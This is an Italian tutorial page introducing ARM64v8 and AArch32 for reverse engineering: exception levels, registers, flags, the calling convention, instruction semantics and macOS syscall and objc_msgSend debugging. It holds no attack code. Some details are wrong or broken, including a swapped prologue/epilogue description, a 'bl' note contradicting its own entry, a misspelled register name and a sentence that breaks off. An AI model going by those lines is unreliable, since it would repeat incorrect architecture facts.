# Introduzione ad ARM64v8

{{#include ../../../banners/hacktricks-training.md}}

## **Livelli di eccezione - EL (ARM64v8)**

Nell'architettura ARMv8, i livelli di esecuzione, noti come Exception Levels (EL), definiscono il livello di privilegi e le capacità dell'ambiente di esecuzione. Ci sono quattro livelli di eccezione, che vanno da EL0 a EL3, ognuno con uno scopo diverso:

1. **EL0 - User Mode**:
- Questo è il livello meno privilegiato ed è usato per eseguire codice applicativo normale.
- Le applicazioni che girano in EL0 sono isolate l'una dall'altra e dal software di sistema, migliorando sicurezza e stabilità.
2. **EL1 - Operating System Kernel Mode**:
- La maggior parte dei kernel degli OS gira a questo livello.
- EL1 ha più privilegi rispetto a EL0 e può accedere a risorse di sistema, ma con alcune restrizioni per garantire l'integrità del sistema.
3. **EL2 - Hypervisor Mode**:
- Questo livello è usato per la virtualizzazione. Un hypervisor che gira in EL2 può gestire più sistemi operativi (ognuno nel proprio EL1) sullo stesso hardware fisico.
- EL2 fornisce funzionalità per l'isolamento e il controllo degli ambienti virtualizzati.
4. **EL3 - Secure Monitor Mode**:
- Questo è il livello più privilegiato ed è spesso usato per secure boot e ambienti di esecuzione fidati.
- EL3 può gestire e controllare gli accessi tra stati secure e non-secure (come secure boot, trusted OS, ecc.).

L'uso di questi livelli permette un modo strutturato e sicuro per gestire i diversi aspetti del sistema, dalle applicazioni utente al software di sistema più privilegiato. L'approccio di ARMv8 ai livelli di privilegio aiuta a isolare efficacemente i diversi componenti del sistema, migliorando la sicurezza e la robustezza.

## **Registers (ARM64v8)**

ARM64 ha **31 registri generali**, etichettati `x0` fino a `x30`. Ognuno può contenere un valore **64-bit** (8 byte). Per operazioni che richiedono solo valori a 32-bit, gli stessi registri possono essere accessi in modalità 32-bit usando i nomi `w0` fino a `w30`.

1. **`x0`** a **`x7`** - Tipicamente usati come registri temporanei e per passare parametri a sottoprocedure.
- **`x0`** inoltre contiene i dati di ritorno di una funzione
2. **`x8`** - Nel kernel Linux, `x8` è usato come numero di system call per l'istruzione `svc`. **In macOS l'x16 è quello usato!**
3. **`x9`** a **`x15`** - Altri registri temporanei, spesso usati per variabili locali.
4. **`x16`** e **`x17`** - **Intra-procedural Call Registers**. Registri temporanei per valori immediati. Sono anche usati per chiamate di funzione indirette e PLT stubs.
- **`x16`** è usato come **system call number** per l'istruzione **`svc`** in **macOS**.
5. **`x18`** - **Platform register**. Può essere usato come registro generale, ma su alcune piattaforme questo registro è riservato a usi specifici della piattaforma: puntatore al current thread environment block in Windows, o per puntare alla struttura del task attualmente **eseguito nel linux kernel**.
6. **`x19`** a **`x28`** - Sono registri callee-saved. Una funzione deve preservare i valori di questi registri per il chiamante, quindi vengono salvati nello stack e recuperati prima di tornare al chiamante.
7. **`x29`** - **Frame pointer** per tenere traccia del frame dello stack. Quando viene creato un nuovo stack frame perché viene chiamata una funzione, il registro **`x29`** viene **salvato nello stack** e il nuovo indirizzo del frame pointer (l'indirizzo di **`sp`**) viene **memorizzato in questo registro**.
- Questo registro può anche essere usato come **registro generale** anche se solitamente è usato come riferimento per le **variabili locali**.
8. **`x30`** o **`lr`** - **Link register**. Contiene l'**indirizzo di ritorno** quando viene eseguita un'istruzione `BL` (Branch with Link) o `BLR` (Branch with Link to Register) memorizzando il valore del **`pc`** in questo registro.
- Può anche essere usato come qualsiasi altro registro.
- Se la funzione corrente chiamerà una nuova funzione e quindi sovrascriverà `lr`, verrà salvato nello stack all'inizio; questo è l'epilogo (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Store `fp` and `lr`, generate space and get new `fp`) e verrà recuperato alla fine; questo è il prologo (`ldp x29, x30, [sp], #48; ret` -> Recover `fp` and `lr` and return).
9. **`sp`** - **Stack pointer**, usato per tenere traccia della cima dello stack.
- Il valore di **`sp`** deve sempre essere mantenuto almeno con un'allineamento a **quadword**, altrimenti può verificarsi un'eccezione di allineamento.
10. **`pc`** - **Program counter**, che punta alla prossima istruzione. Questo registro può essere aggiornato solo tramite generazione di eccezioni, ritorni da eccezioni e branch. Le uniche istruzioni ordinarie che possono leggere questo registro sono le istruzioni branch with link (BL, BLR) che memorizzano l'indirizzo del **`pc`** in **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. Chiamato anche **`wzr`** nella sua forma a **32** bit. Può essere usato per ottenere facilmente il valore zero (operazione comune) o per eseguire confronti usando **`subs`** come **`subs XZR, Xn, #10`** che non memorizza il risultato da nessuna parte (in **`xzr`**).

I registri **`Wn`** sono la versione **32bit** del registro **`Xn`**.

> [!TIP]
> I registri da X0 a X18 sono volatili, il che significa che i loro valori possono essere cambiati da chiamate di funzione e interrupt. Tuttavia, i registri da X19 a X28 sono non-volatili, quindi i loro valori devono essere preservati attraverso le chiamate di funzione ("callee saved").

### SIMD and Floating-Point Registers

Inoltre, ci sono altri **32 registri di lunghezza 128bit** che possono essere usati in operazioni SIMD ottimizzate e per eseguire operazioni in virgola mobile. Questi sono chiamati registri Vn anche se possono operare in **64**-bit, **32**-bit, **16**-bit e **8**-bit e in quei casi sono chiamati **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** e **`Bn`**.

### System Registers

**Esistono centinaia di system registers**, chiamati anche special-purpose registers (SPRs), usati per **monitorare** e **controllare** il comportamento dei **processori**.\
Possono essere letti o impostati solo usando le istruzioni dedicate speciali **`mrs`** e **`msr`**.

I registri speciali **`TPIDR_EL0`** e **`TPIDDR_EL0`** si trovano comunemente durante il reverse engineering. Il suffisso `EL0` indica il **livello minimo di eccezione** dal quale il registro può essere accessibile (in questo caso EL0 è il livello di eccezione regolare con cui girano i programmi normali).\
Spesso sono usati per memorizzare l'**indirizzo base del thread-local storage** nella memoria. Di solito il primo è leggibile e scrivibile per i programmi in EL0, ma il secondo può essere letto da EL0 e scritto da EL1 (come il kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** contiene diversi componenti di processo serializzati nel registro speciale visibile al sistema operativo **`SPSR_ELx`**, dove X è il **livello di permessi dell'eccezione generata** (questo permette di recuperare lo stato del processo quando l'eccezione termina).\
Questi sono i campi accessibili:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- I flag di condizione **`N`**, **`Z`**, **`C`** e **`V`**:
- **`N`** indica che l'operazione ha prodotto un risultato negativo
- **`Z`** indica che l'operazione ha prodotto zero
- **`C`** indica che l'operazione ha generato un carry
- **`V`** indica che l'operazione ha prodotto un overflow con segno:
- La somma di due numeri positivi restituisce un risultato negativo.
- La somma di due numeri negativi restituisce un risultato positivo.
- Nella sottrazione, quando un grande numero negativo viene sottratto da un numero positivo più piccolo (o viceversa), e il risultato non può essere rappresentato nell'intervallo del dato bit-size.
- Ovviamente il processore non sa se l'operazione è con segno o no, quindi controllerà C e V nelle operazioni e indicherà se è avvenuto un carry nel caso fosse segnata o unsigned.

> [!WARNING]
> Non tutte le istruzioni aggiornano questi flag. Alcune come **`CMP`** o **`TST`** lo fanno, e altre che hanno il suffisso s come **`ADDS`** lo fanno.

- Il flag della **larghezza corrente del registro (`nRW`)**: Se il flag ha valore 0, il programma eseguirà nello stato di esecuzione AArch64 una volta ripreso.
- Il corrente **Exception Level** (**`EL`**): Un programma regolare che gira in EL0 avrà valore 0
- Il flag di **single stepping** (**`SS`**): Usato dai debugger per eseguire passo-passo impostando il flag SS a 1 dentro **`SPSR_ELx`** tramite un'eccezione. Il programma eseguirà un passo e genererà un'eccezione di singolo passo.
- Il flag di stato di **illegal exception** (**`IL`**): Viene usato per marcare quando un software privilegiato esegue un trasferimento di livello di eccezione non valido; questo flag viene impostato a 1 e il processore genera un'eccezione di stato illegale.
- I flag **`DAIF`**: Questi flag permettono a un programma privilegiato di mascherare selettivamente certe eccezioni esterne.
- Se **`A`** è 1 significa che verranno innescate **asynchronous aborts**. **`I`** configura la risposta alle richieste di Interrupt esterni (IRQs). e la F è relativa alle **Fast Interrupt Requests** (FIRs).
- I flag di selezione dello stack pointer (**`SPS`**): I programmi privilegiati che girano in EL1 e oltre possono passare dall'uso del proprio stack pointer register a quello del modello utente (es. tra `SP_EL1` e `EL0`). Questo switching è eseguito scrivendo nel registro speciale **`SPSel`**. Questo non può essere fatto da EL0.

## **Calling Convention (ARM64v8)**

La calling convention ARM64 stabilisce che i **primi otto parametri** di una funzione sono passati nei registri **`x0` fino a `x7`**. I parametri **aggiuntivi** sono passati sul **lo stack**. Il valore di **ritorno** è passato indietro nel registro **`x0`**, o anche in **`x1`** se è lungo **128 bit**. I registri **`x19`** a **`x30`** e **`sp`** devono essere **preservati** attraverso le chiamate di funzione.

Quando si legge una funzione in assembly, cercare il **prologo** e l'**epilogo** della funzione. Il **prologo** di solito coinvolge il **salvataggio del frame pointer (`x29`)**, la **configurazione** di un **nuovo frame pointer**, e l**'allocazione di spazio sullo stack**. L'**epilogo** di solito implica il **ripristino del frame pointer salvato** e il **ritorno** dalla funzione.

### Calling Convention in Swift

Swift ha la sua **calling convention** che può essere trovata in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Common Instructions (ARM64v8)**

Le istruzioni ARM64 generalmente hanno il **formato `opcode dst, src1, src2`**, dove **`opcode`** è l'**operazione** da eseguire (come `add`, `sub`, `mov`, ecc.), **`dst`** è il registro **destinazione** dove il risultato sarà memorizzato, e **`src1`** e **`src2`** sono i registri **sorgente**. Possono essere usati anche valori immediati al posto dei registri sorgente.

- **`mov`**: **Sposta** un valore da un **registro** a un altro.
- Example: `mov x0, x1` — Questo sposta il valore da `x1` a `x0`.
- **`ldr`**: **Carica** un valore dalla **memoria** in un **registro**.
- Example: `ldr x0, [x1]` — Questo carica un valore dall'indirizzo di memoria puntato da `x1` in `x0`.
- **Offset mode**: Un offset che interessa il puntatore di origine è indicato, per esempio:
- `ldr x2, [x1, #8]`, questo caricherà in x2 il valore da x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, questo caricherà in x2 un oggetto dall'array x0, dalla posizione x1 (index) * 4
- **Pre-indexed mode**: Questo applicherà i calcoli all'origine, ottiene il risultato e inoltre memorizza la nuova origine nell'origine.
- `ldr x2, [x1, #8]!`, questo caricherà `x1 + 8` in `x2` e memorizzerà in x1 il risultato di `x1 + 8`
- `str lr, [sp, #-4]!`, Memorizza il link register in sp e aggiorna il registro sp
- **Post-index mode**: Questo è come il precedente ma l'indirizzo di memoria viene accesso e poi l'offset viene calcolato e memorizzato.
- `ldr x0, [x1], #8`, carica `x1` in `x0` e aggiorna x1 con `x1 + 8`
- **PC-relative addressing**: In questo caso l'indirizzo da caricare è calcolato relativamente al registro PC
- `ldr x1, =_start`, Questo caricherà in x1 l'indirizzo dove inizia il simbolo `_start` relativo al PC corrente.
- **`str`**: **Memorizza** un valore da un **registro** nella **memoria**.
- Example: `str x0, [x1]` — Questo memorizza il valore in `x0` nell'indirizzo di memoria puntato da `x1`.
- **`ldp`**: **Load Pair of Registers**. Questa istruzione **carica due registri** da **locazioni di memoria consecutive**. L'indirizzo di memoria è tipicamente formato aggiungendo un offset al valore in un altro registro.
- Example: `ldp x0, x1, [x2]` — Questo carica `x0` e `x1` dalle locazioni di memoria a `x2` e `x2 + 8`, rispettivamente.
- **`stp`**: **Store Pair of Registers**. Questa istruzione **memorizza due registri** in **locazioni di memoria consecutive**. L'indirizzo di memoria è tipicamente formato aggiungendo un offset al valore in un altro registro.
- Example: `stp x0, x1, [sp]` — Questo memorizza `x0` e `x1` nelle locazioni di memoria a `sp` e `sp + 8`, rispettivamente.
- `stp x0, x1, [sp, #16]!` — Questo memorizza `x0` e `x1` nelle locazioni di memoria a `sp+16` e `sp + 24`, rispettivamente, e aggiorna `sp` con `sp+16`.
- **`add`**: **Somma** i valori di due registri e memorizza il risultato in un registro.
- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destinazione
- Xn2 -> Operando 1
- Xn3 | #imm -> Operando 2 (registro o immediato)
- \[shift #N | RRX] -> Esegue uno shift o RRX
- Example: `add x0, x1, x2` — Questo somma i valori in `x1` e `x2` e memorizza il risultato in `x0`.
- `add x5, x5, #1, lsl #12` — Questo equivale a 4096 (un 1 shiftato 12 volte) -> 1 0000 0000 0000 0000
- **`adds`** Questo esegue un `add` e aggiorna i flag
- **`sub`**: **Sottrae** i valori di due registri e memorizza il risultato in un registro.
- Vedi la **sintassi** di **`add`**.
- Example: `sub x0, x1, x2` — Questo sottrae il valore in `x2` da `x1` e memorizza il risultato in `x0`.
- **`subs`** Simile a sub ma aggiorna i flag
- **`mul`**: **Moltiplica** i valori di **due registri** e memorizza il risultato in un registro.
- Example: `mul x0, x1, x2` — Questo moltiplica i valori in `x1` e `x2` e memorizza il risultato in `x0`.
- **`div`**: **Divide** il valore di un registro per un altro e memorizza il risultato in un registro.
- Example: `div x0, x1, x2` — Questo divide il valore in `x1` per `x2` e memorizza il risultato in `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Aggiunge 0 dalla fine spostando gli altri bit in avanti (moltiplica per 2^n)
- **Logical shift right**: Aggiunge 0 all'inizio spostando gli altri bit indietro (divide per 2^n in unsigned)
- **Arithmetic shift right**: Come **`lsr`**, ma invece di aggiungere 0 se il bit più significativo è 1, vengono aggiunti 1 (divide per 2^n in signed)
- **Rotate right**: Come **`lsr`** ma ciò che viene rimosso dalla destra viene aggiunto a sinistra
- **Rotate Right with Extend**: Come **`ror`**, ma con il carry flag come "bit più significativo". Quindi il carry flag viene spostato nel bit 31 e il bit rimosso va nel carry flag.
- **`bfm`**: **Bit Filed Move**, queste operazioni **copiano bit `0...n`** da un valore e li posizionano nelle posizioni **`m..m+n`**. Il **`#s`** specifica la **posizione del bit più a sinistra** e **`#r`** la quantità di rotazione a destra.
- Bitfiled move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Copia un bitfield da un registro e lo copia in un altro registro.
- **`BFI X1, X2, #3, #4`** Inserisce 4 bit da X2 a partire dal 3° bit in X1
- **`BFXIL X1, X2, #3, #4`** Estrae dal 3° bit di X2 quattro bit e li copia in X1
- **`SBFIZ X1, X2, #3, #4`** Estende con segno 4 bit da X2 e li inserisce in X1 a partire dalla posizione bit 3 azzerando i bit a destra
- **`SBFX X1, X2, #3, #4`** Estrae 4 bit a partire dal bit 3 da X2, li estende con segno e posiziona il risultato in X1
- **`UBFIZ X1, X2, #3, #4`** Estende a zero 4 bit da X2 e li inserisce in X1 a partire dalla posizione bit 3 azzerando i bit a destra
- **`UBFX X1, X2, #3, #4`** Estrae 4 bit a partire dal bit 3 da X2 e posiziona il risultato zero-extended in X1.
- **Sign Extend To X:** Estende il segno (o aggiunge solo 0 nella versione unsigned) di un valore per poter eseguire operazioni con esso:
- **`SXTB X1, W2`** Estende il segno di un byte **da W2 a X1** (`W2` è metà di `X2`) per riempire i 64 bit
- **`SXTH X1, W2`** Estende il segno di un numero a 16 bit **da W2 a X1** per riempire i 64 bit
- **`SXTW X1, W2`** Estende il segno di un valore da **W2 a X1** per riempire i 64 bit
- **`UXTB X1, W2`** Aggiunge 0 (unsigned) a un byte **da W2 a X1** per riempire i 64 bit
- **`extr`:** Estrae bit da una coppia specificata di registri concatenati.
- Example: `EXTR W3, W2, W1, #3` Questo concatenerà W1+W2 e prenderà **dal bit 3 di W2 fino al bit 3 di W1** e lo memorizzerà in W3.
- **`cmp`**: **Confronta** due registri e imposta i flag di condizione. È un **alias di `subs`** impostando il registro di destinazione al registro zero. Utile per sapere se `m == n`.
- Supporta la **stessa sintassi di `subs`**
- Example: `cmp x0, x1` — Questo confronta i valori in `x0` e `x1` e imposta di conseguenza i flag di condizione.
- **`cmn`**: **Compare negative** operando. In questo caso è un **alias di `adds`** e supporta la stessa sintassi. Utile per sapere se `m == -n`.
- **`ccmp`**: Confronto condizionale, è un confronto che verrà eseguito solo se un confronto precedente è stato vero e imposterà specificamente i bit nzcv.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> se x1 != x2 e x3 < x4, salta a func
- Questo perché **`ccmp`** verrà eseguito solo se il **precedente `cmp` era `NE`**, se non lo era i bit `nzcv` saranno impostati a 0 (il che non soddisferà il confronto `blt`).
- Questo può anche essere usato come `ccmn` (stessa cosa ma negativa, come `cmp` vs `cmn`).
- **`tst`**: Controlla se alcuni dei valori del confronto sono entrambi 1 (funziona come un ANDS senza memorizzare il risultato da nessuna parte). È utile per controllare un registro con un valore e verificare se uno qualsiasi dei bit indicati è 1.
- Example: `tst X1, #7` Controlla se uno degli ultimi 3 bit di X1 è 1
- **`teq`**: Operazione XOR scartando il risultato
- **`b`**: Branch incondizionato
- Example: `b myFunction`
- Nota che questo non popolerà il link register con l'indirizzo di ritorno (non adatto per chiamate a sottoroutine che devono ritornare)
- **`bl`**: **Branch** with link, usato per **chiamare** una **subroutine**. Memorizza l'indirizzo di ritorno in **`x30`**.
- Example: `bl myFunction` — Questo chiama la funzione `myFunction` e memorizza l'indirizzo di ritorno in `x30`.
- Nota che questo non popolerà il link register con l'indirizzo di ritorno (non adatto per chiamate a sottoroutine che devono ritornare)
- **`blr`**: **Branch** with Link to Register, usato per **chiamare** una **subroutine** dove la destinazione è **specificata** in un **registro**. Memorizza l'indirizzo di ritorno in `x30`. (Questo è
- Example: `blr x1` — Questo chiama la funzione il cui indirizzo è contenuto in `x1` e memorizza l'indirizzo di ritorno in `x30`.
- **`ret`**: **Ritorna** dalla **subroutine**, tipicamente usando l'indirizzo in **`x30`**.
- Example: `ret` — Questo ritorna dalla subroutine corrente usando l'indirizzo di ritorno in `x30`.
- **`b.<cond>`**: Branch condizionali
- **`b.eq`**: **Branch se uguale**, basato sulla precedente istruzione `cmp`.
- Example: `b.eq label` — Se la precedente istruzione `cmp` ha trovato due valori uguali, salta a `label`.
- **`b.ne`**: **Branch se non uguale**. Questa istruzione controlla i flag di condizione (impostati da un precedente confronto), e se i valori confrontati non erano uguali, esegue il branch a un'etichetta o indirizzo.
- Example: Dopo un'istruzione `cmp x0, x1`, `b.ne label` — Se i valori in `x0` e `x1` non erano uguali, salta a `label`.
- **`cbz`**: **Compare and Branch on Zero**. Questa istruzione confronta un registro con zero, e se sono uguali, esegue il branch a un'etichetta o indirizzo.
- Example: `cbz x0, label` — Se il valore in `x0` è zero, salta a `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Questa istruzione confronta un registro con zero, e se non sono uguali, esegue il branch a un'etichetta o indirizzo.
- Example: `cbnz x0, label` — Se il valore in `x0` non è zero, salta a `label`.
- **`tbnz`**: Test di un bit e branch se non zero
- Example: `tbnz x0, #8, label`
- **`tbz`**: Test di un bit e branch se zero
- Example: `tbz x0, #8, label`
- **Operazioni di selezione condizionale**: Sono operazioni il cui comportamento varia a seconda dei bit condizionali.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Se vero, X0 = X1, se falso, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Se vero, Xd = Xn, se falso, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Se vero, Xd = Xn + 1, se falso, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Se vero, Xd = Xn, se falso, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Se vero, Xd = NOT(Xn), se falso, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Se vero, Xd = Xn, se falso, Xd = - Xm
- `cneg Xd, Xn, cond` -> Se vero, Xd = - Xn, se falso, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Se vero, Xd = 1, se falso, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Se vero, Xd = \<all 1>, se falso, Xd = 0
- **`adrp`**: Calcola l'**indirizzo di pagina di un simbolo** e lo memorizza in un registro.
- Example: `adrp x0, symbol` — Questo calcola l'indirizzo di pagina di `symbol` e lo memorizza in `x0`.
- **`ldrsw`**: **Carica** un valore **signed 32-bit** dalla memoria e lo **sign-extend** a 64 bit.
- Example: `ldrsw x0, [x1]` — Questo carica un valore signed 32-bit dall'indirizzo di memoria puntato da `x1`, lo estende con segno a 64 bit e lo memorizza in `x0`.
- **`stur`**: **Memorizza** il valore di un registro in una locazione di memoria, usando un offset da un altro registro.
- Example: `stur x0, [x1, #4]` — Questo memorizza il valore in `x0` nell'indirizzo di memoria che è 4 byte maggiore dell'indirizzo attualmente in `x1`.
- **`svc`** : Esegue una **system call**. Sta per "Supervisor Call". Quando il processore esegue questa istruzione, **passa da user mode a kernel mode** e salta a una locazione di memoria specifica dove è presente il codice di gestione delle system call del **kernel**.

- Example:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Salvare il link register e il frame pointer nello stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Imposta il nuovo frame pointer**: `mov x29, sp` (imposta il nuovo frame pointer per la funzione corrente)
3. **Alloca spazio sullo stack per le variabili locali** (se necessario): `sub sp, sp, <size>` (dove `<size>` è il numero di byte necessari)

### **Epilogo della funzione**

1. **Dealloca le variabili locali (se ne sono state allocate)**: `add sp, sp, <size>`
2. **Ripristina il link register e il frame pointer**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (restituisce il controllo al chiamante usando l'indirizzo nel link register)

## AARCH32 Execution State

Armv8-A supporta l'esecuzione di programmi a 32-bit. **AArch32** può funzionare in uno dei **due set di istruzioni**: **`A32`** e **`T32`** e può passare tra di essi tramite **`interworking`**.\
**Privilegiati**  programmi a 64-bit possono schedulare l'**esecuzione di programmi a 32-bit** eseguendo un trasferimento del livello di eccezione al 32-bit con privilegi inferiori.\
Si noti che la transizione da 64-bit a 32-bit avviene con un livello di eccezione inferiore (per esempio un programma a 64-bit in EL1 che avvia un programma in EL0). Questo si ottiene impostando il **bit 4 di** **`SPSR_ELx`** (registro speciale) **a 1** quando il thread di processo `AArch32` è pronto per essere eseguito e il resto di `SPSR_ELx` memorizza il CPSR del programma **`AArch32`**. Poi, il processo privilegiato invoca l'istruzione **`ERET`** così il processore transita in **`AArch32`** entrando in A32 o T32 a seconda del CPSR**.**

L'**`interworking`** avviene usando i bit J e T del CPSR. `J=0` e `T=0` significa **`A32`** e `J=0` e `T=1` significa **T32**. Questo fondamentalmente si traduce nell'impostare il **bit meno significativo a 1** per indicare che il set di istruzioni è T32.\
Questo viene impostato durante le **interworking branch instructions,** ma può anche essere impostato direttamente con altre istruzioni quando il PC è impostato come registro di destinazione. Esempio:

Un altro esempio:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registri

Ci sono 16 registri a 32 bit (r0-r15). **Da r0 a r14** possono essere usati per **qualsiasi operazione**, tuttavia alcuni di essi sono solitamente riservati:

- **`r15`**: Program counter (sempre). Contiene l'indirizzo della prossima istruzione. In A32 corrente + 8, in T32 corrente + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (Nota che lo stack è sempre allineato a 16 byte)
- **`r14`**: Link Register

Inoltre, i registri vengono salvati in **`banked registries`**. Si tratta di aree che memorizzano i valori dei registri consentendo di eseguire una **commutazione di contesto veloce** nella gestione delle eccezioni e nelle operazioni privilegiate, evitando la necessità di salvare e ripristinare manualmente i registri ogni volta.  
Questo avviene salvando lo stato del processore da `CPSR` a `SPSR` della modalità del processore a cui viene gestita l'eccezione. Al ritorno dall'eccezione, il **`CPSR`** viene ripristinato dal **`SPSR`**.

### CPSR - Current Program Status Register

In AArch32 il CPSR funziona in modo simile a **`PSTATE`** in AArch64 ed è anche memorizzato in **`SPSR_ELx`** quando viene presa un'eccezione per poi ripristinare l'esecuzione:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

I campi sono divisi in alcuni gruppi:

- Application Program Status Register (APSR): flag aritmetici e accessibile da EL0
- Execution State Registers: comportamento del processo (gestito dal OS).

#### Application Program Status Register (APSR)

- I flag **`N`**, **`Z`**, **`C`**, **`V`** (proprio come in AArch64)
- Il flag **`Q`**: viene impostato a 1 ogni volta che si verifica una **saturazione intera** durante l'esecuzione di un'istruzione aritmetica saturante specializzata. Una volta impostato a **`1`**, mantiene il valore fino a quando non viene manualmente impostato a 0. Inoltre, non esiste alcuna istruzione che ne verifichi implicitamente il valore; deve essere letto manualmente.
- Flag **`GE`** (Greater than or equal): viene usato nelle operazioni SIMD (Single Instruction, Multiple Data), come "parallel add" e "parallel subtract". Queste operazioni permettono di elaborare più punti dati in una singola istruzione.

Ad esempio, l'istruzione **`UADD8`** aggiunge quattro coppie di byte (da due operandi a 32 bit) in parallelo e memorizza i risultati in un registro a 32 bit. Imposta poi i flag **`GE`** nell'`APSR` basandosi su questi risultati. Ogni flag GE corrisponde a una delle addizioni di byte, indicando se l'addizione per quella coppia di byte è andata in **overflow**.

L'istruzione **`SEL`** usa questi flag GE per eseguire azioni condizionali.

#### Execution State Registers

- I bit **`J`** e **`T`**: **`J`** dovrebbe essere 0 e se **`T`** è 0 viene usato il set di istruzioni A32, se è 1 viene usato T32.
- **IT Block State Register** (`ITSTATE`): sono i bit 10-15 e 25-26. Memorizzano le condizioni per le istruzioni all'interno di un gruppo prefissato con **`IT`**.
- Bit **`E`**: indica la **endianness**.
- **Mode and Exception Mask Bits** (0-4): determinano lo stato di esecuzione corrente. Il **5°** indica se il programma gira come 32bit (1) o 64bit (0). Gli altri 4 rappresentano la modalità di eccezione attualmente in uso (quando si verifica un'eccezione e viene gestita). Il numero impostato **indica la priorità corrente** nel caso in cui un'altra eccezione venga generata mentre questa è in gestione.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Alcune eccezioni possono essere disabilitate usando i bit **`A`**, `I`, `F`. Se **`A`** è 1 significa che verranno attivati gli **asynchronous aborts**. Il bit **`I`** configura la risposta alle richieste di interrupt hardware esterne (IRQ). Il bit **`F`** è correlato alle **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Consulta [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) oppure esegui `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. Le BSD syscalls avranno **x16 > 0**.

### Mach Traps

Guarda in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) la `mach_trap_table` e in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) i prototipi. Il numero massimo di Mach traps è `MACH_TRAP_TABLE_COUNT` = 128. I Mach traps avranno **x16 < 0**, quindi è necessario chiamare i numeri della lista precedente con un **meno**: **`_kernelrpc_mach_vm_allocate_trap`** è **`-10`**.

Puoi anche controllare **`libsystem_kernel.dylib`** in un disassembler per scoprire come chiamare queste syscall (e le BSD):
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

> [!TIP]
> A volte è più facile controllare il codice **decompiled** di **`libsystem_kernel.dylib`** **than** controllare il **codice sorgente** perché il codice di diverse syscalls (BSD e Mach) è generato tramite script (controlla i commenti nel codice sorgente), mentre nel dylib puoi trovare cosa viene effettivamente chiamato.

### machdep calls

XNU supporta un altro tipo di chiamate chiamate machine-dependent. I numeri di queste chiamate dipendono dall'architettura e né le chiamate né i numeri sono garantiti di rimanere costanti.

### comm page

This is a kernel owner memory page that is mapped into the address scape of every users process. It's meant to make the transition from user mode to kernel space faster than using syscalls for kernel services that are used so much the this transition would be vey inneficient.

Per esempio la chiamata `gettimeofdate` legge il valore di `timeval` direttamente dalla comm page.

### objc_msgSend

È molto comune trovare questa funzione usata in programmi Objective-C o Swift. Questa funzione permette di chiamare un metodo di un oggetto Objective-C.

Parametri ([maggiori informazioni nella documentazione](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Puntatore all'istanza
- x1: op -> Selector del metodo
- x2... -> Il resto degli argomenti del metodo invocato

Quindi, se metti un breakpoint prima del branch verso questa funzione, puoi facilmente scoprire cosa viene invocato in lldb con (in questo esempio l'oggetto chiama un oggetto di `NSConcreteTask` che eseguirà un comando):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Impostando la variabile d'ambiente **`NSObjCMessageLoggingEnabled=1`** è possibile ottenere un log quando questa funzione viene chiamata in un file come `/tmp/msgSends-pid`.
>
> Inoltre, impostando **`OBJC_HELP=1`** e chiamando qualsiasi binary puoi vedere altre environment variables che potresti usare per **log** quando certe azioni Objc-C si verificano.

